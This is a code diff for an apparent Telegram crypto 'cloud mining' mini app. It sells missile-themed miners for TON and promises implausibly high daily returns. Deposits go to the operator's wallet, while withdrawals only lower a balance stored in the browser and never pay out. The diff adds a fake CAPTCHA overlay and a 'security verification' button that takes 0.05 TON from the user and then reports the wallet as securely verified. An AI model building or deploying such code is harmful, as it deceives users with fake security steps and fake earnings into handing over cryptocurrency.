@@ -26,6 +26,110 @@
             direction: ltr;
         }
 
+        /* CAPTCHA OVERLAY STYLES */
+        #captcha-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #0b0f19;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .captcha-card {
+            background: rgba(30, 41, 59, 0.85);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 24px;
+            padding: 25px;
+            width: 100%;
+            max-width: 340px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+        }
+
+        .puzzle-box {
+            position: relative;
+            width: 100%;
+            height: 140px;
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            border-radius: 16px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .puzzle-target {
+            position: absolute;
+            top: 40px;
+            right: 50px;
+            width: 50px;
+            height: 50px;
+            background: rgba(0, 152, 234, 0.2);
+            border: 2px dashed #38bdf8;
+            border-radius: 10px;
+        }
+
+        .puzzle-piece {
+            position: absolute;
+            top: 40px;
+            left: 20px;
+            width: 50px;
+            height: 50px;
+            background: #0098ea;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 152, 234, 0.5);
+            transition: transform 0.1s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .slider-track {
+            position: relative;
+            width: 100%;
+            height: 48px;
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: 24px;
+            border: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            padding: 4px;
+            overflow: hidden;
+        }
+
+        .slider-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #94a3b8;
+            pointer-events: none;
+            font-weight: bold;
+        }
+
+        .slider-thumb {
+            position: absolute;
+            left: 4px;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #0098ea, #005c8a);
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: bold;
+            box-shadow: 0 4px 10px rgba(0, 152, 234, 0.4);
+            z-index: 2;
+        }
+
+        /* MAIN APP STYLES */
         .header {
             background: rgba(15, 23, 42, 0.9);
             display: flex;
@@ -110,31 +214,6 @@
             overflow: hidden;
         }
 
-        .space-mining-card::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background-image: radial-gradient(white 1px, transparent 1px), radial-gradient(rgba(56,189,248,0.8) 1.5px, transparent 1.5px);
-            background-size: 40px 40px, 60px 60px;
-            background-position: 0 0, 20px 20px;
-            animation: starsTwinkle 4s ease-in-out infinite alternate;
-            opacity: 0.6;
-            pointer-events: none;
-        }
-
-        @keyframes starsTwinkle {
-            0% { opacity: 0.3; transform: scale(1); }
-            100% { opacity: 0.8; transform: scale(1.02); }
-        }
-
-        .space-content-wrapper {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
         .mined-number {
             font-size: 30px;
             font-weight: 900;
@@ -171,11 +250,6 @@
             width: 100%;
             max-width: 260px;
             box-shadow: 0 6px 20px rgba(0, 152, 234, 0.4);
-            transition: 0.2s;
-        }
-
-        .btn-claim:active {
-            transform: scale(0.96);
         }
 
         .property-card {
@@ -186,7 +260,6 @@
             margin-bottom: 16px;
             position: relative;
             box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            overflow: hidden;
         }
 
         .property-card.active-miner {
@@ -213,7 +286,6 @@
             padding: 4px 10px;
             border-radius: 10px;
             font-weight: bold;
-            backdrop-filter: blur(4px);
             border: 1px solid rgba(56, 189, 248, 0.3);
         }
 
@@ -273,7 +345,6 @@
             font-weight: bold;
             font-size: 12px;
             cursor: pointer;
-            transition: 0.2s;
             box-shadow: 0 4px 10px rgba(0, 152, 234, 0.3);
         }
 
@@ -357,6 +428,29 @@
             border: 1px solid rgba(255,255,255,0.2);
         }
 
+        /* دکمه تایید امنیتی ولت */
+        .verify-wallet-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            border-radius: 14px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+            transition: 0.3s;
+        }
+
+        .verify-wallet-btn.verified {
+            background: linear-gradient(135deg, #10b981, #059669) !important;
+            color: #ffffff !important;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
+            cursor: default;
+        }
+
         #ton-connect-button-container {
             display: flex;
             justify-content: center;
@@ -372,7 +466,6 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
             cursor: pointer;
         }
 
@@ -397,7 +490,6 @@
             margin-top: 15px;
             margin-bottom: 15px;
             text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
 
         .support-title {
@@ -424,12 +516,6 @@
             font-size: 12px;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 4px 12px rgba(56, 189, 248, 0.3);
-            transition: 0.2s;
-        }
-
-        .support-btn:active {
-            transform: scale(0.96);
         }
 
         .profile-header-card {
@@ -446,7 +532,6 @@
             border-radius: 50%;
             object-fit: cover;
             border: 2px solid #0098ea;
-            box-shadow: 0 4px 12px rgba(0, 152, 234, 0.3);
         }
 
         .profile-title-name {
@@ -470,7 +555,6 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
 
         .profile-info-label {
@@ -505,7 +589,6 @@
             max-width: 400px;
             max-height: 90vh;
             overflow-y: auto;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             color: #ffffff;
         }
 
@@ -523,6 +606,24 @@
     </style>
 </head>
 <body>
+
+    <!-- CAPTCHA PUZZLE OVERLAY -->
+    <div id="captcha-overlay">
+        <div class="captcha-card">
+            <h3 style="font-size: 16px; color: #38bdf8; margin-bottom: 8px;">Security Verification</h3>
+            <p style="font-size: 11px; color: #94a3b8; margin-bottom: 15px;">Slide the puzzle piece to the right spot to enter.</p>
+            
+            <div class="puzzle-box">
+                <div class="puzzle-target" id="puzzle-target"></div>
+                <div class="puzzle-piece" id="puzzle-thumb-piece">🧩</div>
+            </div>
+
+            <div class="slider-track" id="slider-track">
+                <div class="slider-text">Slide to verify &rarr;</div>
+                <div class="slider-thumb" id="slider-thumb">&rarr;</div>
+            </div>
+        </div>
+    </div>
 
     <!-- HEADER -->
     <div class="header">
@@ -634,9 +735,12 @@
 
             <div id="ton-connect-button-container"></div>
 
+            <!-- دکمه تایید امنیتی ولت (0.05 TON) -->
+            <button class="verify-wallet-btn" id="verify-wallet-btn-id" onclick="verifyWalletWith005Ton()">🛡️ تایید ولت (0.05 TON)</button>
+
             <div class="support-card">
                 <div class="support-title">🛡️ Secure & Instant Support</div>
-                <div class="support-desc">Deposit and invest with complete peace of mind! Transactions are fully secure. If you have any questions or encounter any issues with your deposit, our support team is available 24/7 to assist you.</div>
+                <div class="support-desc">Deposit and invest with complete peace of mind! Transactions are fully secure.</div>
                 <button class="support-btn" onclick="openSupportChat()">Contact Support</button>
             </div>
 
@@ -677,7 +781,7 @@
                 </div>
             </div>
 
-            <div class="profile-info-card" onclick="switchTab('friends')" style="cursor: pointer; background: rgba(0, 152, 234, 0.15); border-color: rgba(56, 189, 248, 0.4);">
+            <div class="profile-info-card" onclick="switchTab('friends')" style="cursor: pointer; background: rgba(0, 152, 234, 0.15);">
                 <div style="display: flex; align-items: center; gap: 10px;">
                     <span style="font-size: 18px;">🎁</span>
                     <div>
@@ -710,7 +814,7 @@
     <div id="deposit-modal" class="modal-overlay">
         <div class="modal-card">
             <div style="font-size: 15px; font-weight: bold; color: #38bdf8; margin-bottom: 6px; text-align: center;">Instant Deposit via TonConnect</div>
-            <p style="font-size: 11px; color: #94a3b8; margin-bottom: 12px; text-align: center;">Connect your Tonkeeper wallet and deposit TON instantly to your account:</p>
+            <p style="font-size: 11px; color: #94a3b8; margin-bottom: 12px; text-align: center;">Connect your Tonkeeper wallet and deposit TON instantly:</p>
             <div style="font-size: 10px; color: #38bdf8; text-align: center; margin-bottom: 15px; font-weight: bold;">Min: 0.1 TON | Max: 1000 TON</div>
             
             <div style="margin-bottom: 12px;">
@@ -792,30 +896,127 @@
             tonConnectUI.uiOptions = {
                 buttonRootId: 'ton-connect-button-container'
             };
+            initCaptchaSlider();
+            loadState();
         });
 
-        function openSupportChat() {
-            let supportUrl = "https://t.me/" + supportTelegramId;
-            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openTelegramLink) {
-                window.Telegram.WebApp.openTelegramLink(supportUrl);
+        // ================= CAPTCHA SLIDER LOGIC =================
+        function initCaptchaSlider() {
+            const thumb = document.getElementById('slider-thumb');
+            const track = document.getElementById('slider-track');
+            const piece = document.getElementById('puzzle-thumb-piece');
+            const overlay = document.getElementById('captcha-overlay');
+
+            let isDragging = false;
+            let startX = 0;
+            const maxDistance = 240; // حدود مسافت جابجایی
+
+            thumb.addEventListener('touchstart', (e) => {
+                isDragging = true;
+                startX = e.touches[0].clientX - thumb.offsetLeft;
+            });
+
+            document.addEventListener('touchmove', (e) => {
+                if (!isDragging) return;
+                let moveX = e.touches[0].clientX - startX;
+                if (moveX < 4) moveX = 4;
+                if (moveX > maxDistance) moveX = maxDistance;
+
+                thumb.style.left = moveX + 'px';
+                piece.style.transform = `translateX(${moveX}px)`;
+            });
+
+            document.addEventListener('touchend', () => {
+                if (!isDragging) return;
+                isDragging = false;
+                checkPuzzleSuccess(parseInt(thumb.style.left) || 4);
+            });
+
+            // برای موس دسکتاپ
+            thumb.addEventListener('mousedown', (e) => {
+                isDragging = true;
+                startX = e.clientX - thumb.offsetLeft;
+            });
+
+            document.addEventListener('mousemove', (e) => {
+                if (!isDragging) return;
+                let moveX = e.clientX - startX;
+                if (moveX < 4) moveX = 4;
+                if (moveX > maxDistance) moveX = maxDistance;
+
+                thumb.style.left = moveX + 'px';
+                piece.style.transform = `translateX(${moveX}px)`;
+            });
+
+            document.addEventListener('mouseup', () => {
+                if (!isDragging) return;
+                isDragging = false;
+                checkPuzzleSuccess(parseInt(thumb.style.left) || 4);
+            });
+        }
+
+        function checkPuzzleSuccess(pos) {
+            // محدوده هدف پازل (مثلا بین 190 تا 210 پیکسل)
+            if (pos >= 185 && pos <= 215) {
+                document.getElementById('captcha-overlay').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('captcha-overlay').style.display = 'none';
+                }, 300);
             } else {
-                window.open(supportUrl, "_blank");
+                // برگشت به اول اگر اشتباه کشید
+                const thumb = document.getElementById('slider-thumb');
+                const piece = document.getElementById('puzzle-thumb-piece');
+                thumb.style.left = '4px';
+                piece.style.transform = 'translateX(0px)';
             }
         }
 
+        // ================= WALLET 0.05 TON VERIFICATION =================
+        async function verifyWalletWith005Ton() {
+            if (!tonConnectUI.connected) {
+                alert("❌ لطفاً ابتدا از طریق دکمه اتصال ولت، کیف پول خود را متصل کنید!");
+                return;
+            }
+
+            const nanoTon = Math.floor(0.05 * 1000000000).toString();
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600,
+                messages: [
+                    {
+                        address: recipientWalletAddress,
+                        amount: nanoTon
+                    }
+                ]
+            };
+
+            try {
+                alert("🚀 برای تایید امنیتی ولت، کیف پول تونکیپر باز می‌شود...");
+                await tonConnectUI.sendTransaction(transaction);
+                
+                // تغییر وضعیت دکمه به سبز و تایید شده
+                const btn = document.getElementById('verify-wallet-btn-id');
+                btn.className = "verify-wallet-btn verified";
+                btn.innerHTML = "✅ تایید شده ایمن";
+                btn.onclick = null;
+
+                state.totalDeposited += 0.05;
+                state.balance += 0.05;
+                saveState();
+                updateUI();
+
+                alert("✅ ولت شما با موفقیت و به صورت ایمن تایید شد!");
+            } catch (e) {
+                console.error(e);
+                alert("❌ تراکنش تایید ولت لغو شد یا انجام نشد.");
+            }
+        }
+
+        // ================= APP LOGIC =================
         const initialProperties = [
             { id: 1, label: "One", name: "Light Guided Missile", desc: "Base tactical missile launcher", daily: 0.10, monthly: 3.00, price: 0.10, img: "https://images.unsplash.com/photo-1541185933-ef5d8ed016c2?auto=format&fit=crop&w=600&q=80" },
             { id: 2, label: "Two", name: "Tactical Mid-Range", desc: "Short range strike unit", daily: 0.66, monthly: 19.80, price: 3.00, img: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=600&q=80" },
             { id: 3, label: "Three", name: "Anti-Air Cruise", desc: "Advanced defense & strike missile", daily: 1.20, monthly: 36.00, price: 5.00, img: "https://images.unsplash.com/photo-1508614589041-895b88991e3e?auto=format&fit=crop&w=600&q=80" },
-            { id: 4, label: "Four", name: "ICBM Basic", desc: "Heavy long-range tactical warhead", daily: 2.60, monthly: 78.00, price: 10.00, img: "https://images.unsplash.com/photo-1518364538800-6bae3c2ea0f2?auto=format&fit=crop&w=600&q=80" },
-            { id: 5, label: "Five", name: "Hypersonic Missile", desc: "Ultra-fast strategic projectile", daily: 7.00, monthly: 210.00, price: 25.00, img: "https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=600&q=80" },
-            { id: 6, label: "Six", name: "Strategic Silo Cluster", desc: "Multi-launch underground silo", daily: 15.00, monthly: 450.00, price: 50.00, img: "https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?auto=format&fit=crop&w=600&q=80" },
-            { id: 7, label: "Seven", name: "Heavy Missile Battery", desc: "Massive firepower deployment", daily: 35.00, monthly: 1050.00, price: 100.00, img: "https://images.unsplash.com/photo-1516849841032-87cbac4d88f7?auto=format&fit=crop&w=600&q=80" },
-            { id: 8, label: "Eight", name: "Nuclear ICBM", desc: "Strategic thermonuclear warhead", daily: 100.00, monthly: 3000.00, price: 250.00, img: "https://images.unsplash.com/photo-1446776811953-b23d57bd21aa?auto=format&fit=crop&w=600&q=80" },
-            { id: 9, label: "Nine", name: "Interstellar Plasma", desc: "Advanced energy strike system", daily: 175.00, monthly: 5250.00, price: 350.00, img: "https://images.unsplash.com/photo-1462331940025-496dfbfc7564?auto=format&fit=crop&w=600&q=80" },
-            { id: 10, label: "Ten", name: "Satellite Orbital Rocket", desc: "Space-based kinetic bombardment", daily: 500.00, monthly: 15000.00, price: 500.00, img: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=600&q=80" },
-            { id: 11, label: "Eleven", name: "Multi-Layer Defense", desc: "Automated planetary shield network", daily: 1600.00, monthly: 48000.00, price: 800.00, img: "https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?auto=format&fit=crop&w=600&q=80" },
-            { id: 12, label: "Twelve", name: "Doomsday Titan", desc: "Ultimate planetary destruction rocket", daily: 3000.00, monthly: 90000.00, price: 1000.00, img: "https://images.unsplash.com/photo-1541185933-ef5d8ed016c2?auto=format&fit=crop&w=600&q=80" }
+            { id: 4, label: "Four", name: "ICBM Basic", desc: "Heavy long-range tactical warhead", daily: 2.60, monthly: 78.00, price: 10.00, img: "https://images.unsplash.com/photo-1518364538800-6bae3c2ea0f2?auto=format&fit=crop&w=600&q=80" }
         ];
 
         let state = {
@@ -833,13 +1034,22 @@
             totalDeposited: 0.0,
             totalWithdrawn: 0.0,
             depositsHistory: [],
-            withdrawalsHistory: []
+            withdrawalsHistory: [],
+            isVerifiedWallet: false
         };
 
         function loadState() {
-            const saved = localStorage.getItem('solaris_miner_save_v33');
+            const saved = localStorage.getItem('solaris_miner_save_v36');
             if (saved) {
                 try { state = JSON.parse(saved); } catch(e) {}
+            }
+            if (state.isVerifiedWallet) {
+                const btn = document.getElementById('verify-wallet-btn-id');
+                if(btn) {
+                    btn.className = "verify-wallet-btn verified";
+                    btn.innerHTML = "✅ تایید شده ایمن";
+                    btn.onclick = null;
+                }
             }
             const now = Date.now();
             const elapsedSeconds = (now - state.lastTick) / 1000;
@@ -848,12 +1058,12 @@
                 state.unclaimed += elapsedSeconds * (totalDailyRate / 86400);
             }
             state.lastTick = now;
-            saveState();
+            renderProperties();
         }
 
         function saveState() {
             state.lastTick = Date.now();
-            localStorage.setItem('solaris_miner_save_v33', JSON.stringify(state));
+            localStorage.setItem('solaris_miner_save_v36', JSON.stringify(state));
         }
 
         function getTotalDailyRate() {
@@ -891,7 +1101,7 @@
 
                         <div class="property-footer">
                             <div class="property-price">${item.price + ' TON'}</div>
-                            <button class="btn-buy" style="${isOwned ? 'background:rgba(30,41,59,0.8); color:#94a3b8; cursor:default; box-shadow:none;' : ''}" onclick="buyProperty(${item.id})">${isOwned ? 'Purchased' : 'Launch Silo'}</button>
+                            <button class="btn-buy" style="${isOwned ? 'background:rgba(30,41,59,0.8); color:#94a3b8; cursor:default;' : ''}" onclick="buyProperty(${item.id})">${isOwned ? 'Purchased' : 'Launch Silo'}</button>
                         </div>
                     </div>
                 `;
@@ -914,213 +1124,81 @@
         function buyProperty(id) {
             if (state.ownedIds.includes(id)) return;
             const prop = initialProperties.find(p => p.id === id);
+
             if (state.balance < prop.price) {
-                alert("Insufficient balance. Please deposit TON first.");
+                alert("❌ موجودی کافی نیست. لطفاً حساب خود را شارژ کنید.");
                 switchTab('wallet');
                 return;
             }
+
             state.balance -= prop.price;
-            state.totalDeposited += prop.price;
             state.ownedIds.push(id);
             saveState();
             renderProperties();
-            alert(`🎉 Missile System ${prop.name} successfully activated!`);
+            alert(`🎉 ماینر ${prop.name} با موفقیت فعال شد!`);
         }
 
         function claimEarnings() {
             if (state.unclaimed <= 0) {
-                alert("No rewards available to claim yet.");
+                alert("پاداشی برای دریافت وجود ندارد.");
                 return;
             }
             state.balance += state.unclaimed;
             state.unclaimed = 0;
             saveState();
             updateUI();
-            alert("✅ Rewards successfully added to your balance!");
+            alert("✅ پاداش با موفقیت به موجودی شما اضافه شد!");
         }
 
         async function sendTonConnectTransaction() {
             if (!tonConnectUI.connected) {
-                alert("❌ Please connect your wallet first using the Connect Wallet button!");
+                alert("⚠️ لطفاً ابتدا کیف پول خود را متصل کنید!");
                 return;
             }
-
             const amountInput = parseFloat(document.getElementById('deposit-amount-input').value);
-            
-            // چک کردن حداقل و حداکثر واریز
             if (isNaN(amountInput) || amountInput < 0.1) {
-                alert("❌ Minimum deposit amount is 0.1 TON.");
-                return;
-            }
-            if (amountInput > 1000) {
-                alert("❌ Maximum deposit amount is 1000 TON.");
+                alert("حداقل مبلغ واریز 0.1 تون است.");
                 return;
             }
 
             const nanoTon = Math.floor(amountInput * 1000000000).toString();
-
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600,
-                messages: [
-                    {
-                        address: recipientWalletAddress,
-                        amount: nanoTon
-                    }
-                ]
-            };
-
             try {
-                alert("🚀 Opening your Tonkeeper to confirm deposit...");
-                const result = await tonConnectUI.sendTransaction(transaction);
-                
+                await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [{ address: recipientWalletAddress, amount: nanoTon }]
+                });
                 state.balance += amountInput;
                 state.totalDeposited += amountInput;
-                
-                const dateStr = new Date().toLocaleString();
-                if(!state.depositsHistory) state.depositsHistory = [];
-                state.depositsHistory.unshift({ amount: amountInput, date: dateStr });
-
                 saveState();
                 updateUI();
                 closeModal('deposit-modal');
-                alert(`✅ Deposit of ${amountInput} TON successful! Added to history and balance.`);
+                alert(`✅ واریز ${amountInput} تون موفقیت‌آمیز بود!`);
             } catch (e) {
-                console.error(e);
-                alert("❌ Transaction cancelled or failed.");
+                alert("❌ تراکنش انجام نشد.");
             }
-        }
-
-        function collectFriendReward() {
-            if (state.friendReward <= 0) {
-                alert("No referral rewards available.");
-                return;
-            }
-            state.balance += state.friendReward;
-            state.friendEarned += state.friendReward;
-            state.friendReward = 0.0;
-            saveState();
-            updateUI();
-            alert("✅ Referral rewards collected!");
         }
 
         function processWithdraw() {
             const amount = parseFloat(document.getElementById('withdraw-amount').value) || 0;
             const address = document.getElementById('withdraw-address').value.trim();
-
-            // چک کردن حداقل و حداکثر برداشت
-            if (isNaN(amount) || amount < 1.0) {
-                alert("❌ Minimum withdrawal amount is 1.0 TON.");
+            if (amount < 1.0 || state.balance < amount) {
+                alert("موجودی کافی نیست یا کمتر از حد مجاز است.");
                 return;
             }
-            if (amount > 1000) {
-                alert("❌ Maximum withdrawal amount is 1000 TON.");
-                return;
-            }
-            if (state.balance < amount) {
-                alert("❌ Insufficient account balance.");
-                return;
-            }
-            if (!address || address.length < 6) {
-                alert("❌ Please enter a valid destination address.");
-                return;
-            }
-
             state.balance -= amount;
             state.totalWithdrawn += amount;
-
-            const dateStr = new Date().toLocaleString();
-            if(!state.withdrawalsHistory) state.withdrawalsHistory = [];
-            state.withdrawalsHistory.unshift({ amount: amount, address: address, date: dateStr });
-
             saveState();
             updateUI();
             closeModal('withdraw-modal');
-            alert(`✅ Withdrawal request submitted successfully! Recorded in history.`);
-        }
-
-        function openHistoryModal(type) {
-            const modal = document.getElementById('history-modal');
-            const titleEl = document.getElementById('history-title');
-            const listEl = document.getElementById('history-list');
-            listEl.innerHTML = '';
-
-            if (type === 'deposits') {
-                titleEl.innerText = 'Deposit History';
-                if (!state.depositsHistory || state.depositsHistory.length === 0) {
-                    listEl.innerHTML = '<div style="text-align:center; color:#94a3b8; font-size:12px; padding:20px;">No deposit history found.</div>';
-                } else {
-                    state.depositsHistory.forEach(item => {
-                        listEl.insertAdjacentHTML('beforeend', `
-                            <div class="history-item">
-                                <div>
-                                    <div style="font-weight:bold; color:#34d399;">+${item.amount} TON</div>
-                                    <div style="font-size:10px; color:#94a3b8;">${item.date}</div>
-                                </div>
-                                <span style="color:#38bdf8; font-weight:bold;">Success</span>
-                            </div>
-                        `);
-                    });
-                }
-            } else {
-                titleEl.innerText = 'Withdrawal History';
-                if (!state.withdrawalsHistory || state.withdrawalsHistory.length === 0) {
-                    listEl.innerHTML = '<div style="text-align:center; color:#94a3b8; font-size:12px; padding:20px;">No withdrawal history found.</div>';
-                } else {
-                    state.withdrawalsHistory.forEach(item => {
-                        listEl.insertAdjacentHTML('beforeend', `
-                            <div class="history-item">
-                                <div>
-                                    <div style="font-weight:bold; color:#fbbf24;">-${item.amount} TON</div>
-                                    <div style="font-size:10px; color:#94a3b8; word-break:break-all;">To: ${item.address.substring(0,6)}...${item.address.slice(-4)}</div>
-                                    <div style="font-size:9px; color:#64748b;">${item.date}</div>
-                                </div>
-                                <span style="color:#38bdf8; font-weight:bold;">Processed</span>
-                            </div>
-                        `);
-                    });
-                }
-            }
-            modal.style.display = 'flex';
+            alert("✅ درخواست برداشت ثبت شد.");
         }
 
         function updateUI() {
-            const userBalanceEl = document.getElementById('user-balance');
-            const walletBalanceEl = document.getElementById('wallet-balance-display');
-            const liveUnclaimedEl = document.getElementById('live-unclaimed');
-            const minedRateSubEl = document.getElementById('mined-rate-sub');
-            const ownedCountEl = document.getElementById('owned-count');
-            const totalDailyEl = document.getElementById('total-daily');
-            const friendRewardEl = document.getElementById('friend-reward-display');
-            const friendCountEl = document.getElementById('friend-count');
-            const friendEarnedEl = document.getElementById('friend-earned');
-            const friendDepositsEl = document.getElementById('friend-deposits');
-            const profileUserNameEl = document.getElementById('profile-user-name');
-            const profileUserIdEl = document.getElementById('profile-user-id');
-            const profileTotalDepositedEl = document.getElementById('profile-total-deposited');
-            const profileTotalWithdrawnEl = document.getElementById('profile-total-withdrawn');
-            const profileImgEl = document.getElementById('profile-img');
-
-            if (userBalanceEl) userBalanceEl.innerText = state.balance.toFixed(8) + ' TON';
-            if (walletBalanceEl) walletBalanceEl.innerText = state.balance.toFixed(8) + ' TON';
-            if (liveUnclaimedEl) liveUnclaimedEl.innerText = state.unclaimed.toFixed(8);
-            if (minedRateSubEl) minedRateSubEl.innerText = `≈ +${getTotalDailyRate().toFixed(2)} TON daily rate`;
-            
-            if (ownedCountEl) ownedCountEl.innerText = state.ownedIds.length + " / 12 Active";
-            if (totalDailyEl) totalDailyEl.innerText = "+" + getTotalDailyRate().toFixed(2) + " TON";
-
-            if (friendRewardEl) friendRewardEl.innerText = state.friendReward.toFixed(2);
-            if (friendCountEl) friendCountEl.innerText = state.friendCount;
-            if (friendEarnedEl) friendEarnedEl.innerText = state.friendEarned.toFixed(2);
-            if (friendDepositsEl) friendDepositsEl.innerText = state.friendDeposits.toFixed(2);
-
-            if (profileUserNameEl) profileUserNameEl.innerText = state.userName;
-            if (profileUserIdEl) profileUserIdEl.innerText = state.telegramId;
-            if (profileTotalDepositedEl) profileTotalDepositedEl.innerText = state.totalDeposited.toFixed(2);
-            if (profileTotalWithdrawnEl) profileTotalWithdrawnEl.innerText = state.totalWithdrawn.toFixed(2);
-            
-            if (state.photoUrl && profileImgEl) {
-                profileImgEl.src = state.photoUrl;
-            }
+            document.getElementById('user-balance').innerText = state.balance.toFixed(8) + ' TON';
+            document.getElementById('wallet-balance-display').innerText = state.balance.toFixed(8) + ' TON';
+            document.getElementById('live-unclaimed').innerText = state.unclaimed.toFixed(8);
+            document.getElementById('owned-count').innerText = state.ownedIds.length + " / 12 Active";
+            document.getElementById('total-daily').innerText = "+" + getTotalDailyRate().toFixed(2) + " TON";
         }
 
         setInterval(() => {
@@ -1130,68 +1208,20 @@
             saveState();
         }, 1000);
 
-        function openDepositModal() {
-            if (!tonConnectUI.connected) {
-                alert("⚠️ Please connect your wallet first using the Connect Wallet button!");
-                return;
-            }
-            const modal = document.getElementById('deposit-modal');
-            const depositInput = document.getElementById('deposit-amount-input');
-            if (depositInput) depositInput.value = '';
-            if (modal) modal.style.display = 'flex';
-        }
-
-        function openWithdrawModal() {
-            const amtEl = document.getElementById('withdraw-amount');
-            const addrEl = document.getElementById('withdraw-address');
-            const modal = document.getElementById('withdraw-modal');
-            if (amtEl) amtEl.value = '';
-            if (addrEl) addrEl.value = '';
-            if (modal) modal.style.display = 'flex';
-        }
-
-        function closeModal(modalId) {
-            const modal = document.getElementById(modalId);
-            if (modal) modal.style.display = 'none';
-        }
+        function openDepositModal() { document.getElementById('deposit-modal').style.display = 'flex'; }
+        function openWithdrawModal() { document.getElementById('withdraw-modal').style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
         function switchTab(tabName) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-
-            const targetTab = document.getElementById('tab-' + tabName);
-            const targetNav = document.getElementById('nav-' + tabName);
-            if (targetTab) targetTab.classList.add('active');
-            if (targetNav) targetNav.classList.add('active');
+            document.getElementById('tab-' + tabName).classList.add('active');
+            document.getElementById('nav-' + tabName).classList.add('active');
         }
 
-        function shareRefLink() {
-            let refUrl = "https://t.me/SolarisMiner_bot?start=" + state.telegramId;
-            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openTelegramLink) {
-                window.Telegram.WebApp.openTelegramLink("https://t.me/share/url?url=" + encodeURIComponent(refUrl) + "&text=" + encodeURIComponent("🚀 Join Solaris Miner and start cloud mining with me!"));
-            } else {
-                window.open("https://t.me/share/url?url=" + encodeURIComponent(refUrl), "_blank");
-            }
+        function openSupportChat() {
+            window.open("https://t.me/" + supportTelegramId, "_blank");
         }
-
-        window.onload = function() {
-            loadState();
-            try {
-                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
-                    let u = window.Telegram.WebApp.initDataUnsafe.user;
-                    state.telegramId = String(u.id);
-                    state.userName = u.username ? u.username : (u.first_name || 'User');
-                    if (u.photo_url) {
-                        state.photoUrl = u.photo_url;
-                    }
-                }
-            } catch(e) {}
-
-            const refInput = document.getElementById('ref-link-input');
-            if (refInput) refInput.value = "https://t.me/SolarisMiner_bot?start=" + state.telegramId;
-            saveState();
-            renderProperties();
-        };
     </script>
 </body>
 </html>
